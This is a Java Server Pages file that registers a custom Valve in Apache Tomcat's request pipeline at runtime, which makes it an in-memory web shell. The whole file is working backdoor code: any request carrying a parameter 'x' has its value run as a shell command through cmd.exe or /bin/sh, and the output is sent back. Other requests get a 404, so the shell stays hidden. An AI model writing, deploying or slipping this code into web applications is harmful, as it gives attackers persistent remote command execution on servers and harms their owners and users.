<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardPipeline" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class MemValve extends ValveBase{
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            try {
                String arg0 = request.getParameter("x");
                PrintWriter writer = response.getWriter();
                if (arg0 != null) {
                    String o = "";
                    ProcessBuilder p;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                    } else {
                        p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                    }

                    Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\A");
                    o = c.hasNext() ? c.next() : o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                } else {
                    response.sendError(404);
                }
            } catch (Exception var8) {
            }
        }
    }
%>
<%
    // WebappClassLoaderBase--->ApplicationContext(getResources().getContext())
    WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    // StandardContext extends ContainerBase
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    StandardPipeline pipeline = (StandardPipeline) standardContext.getPipeline();
    MemValve mem = new MemValve();
    pipeline.addValve(mem);
%>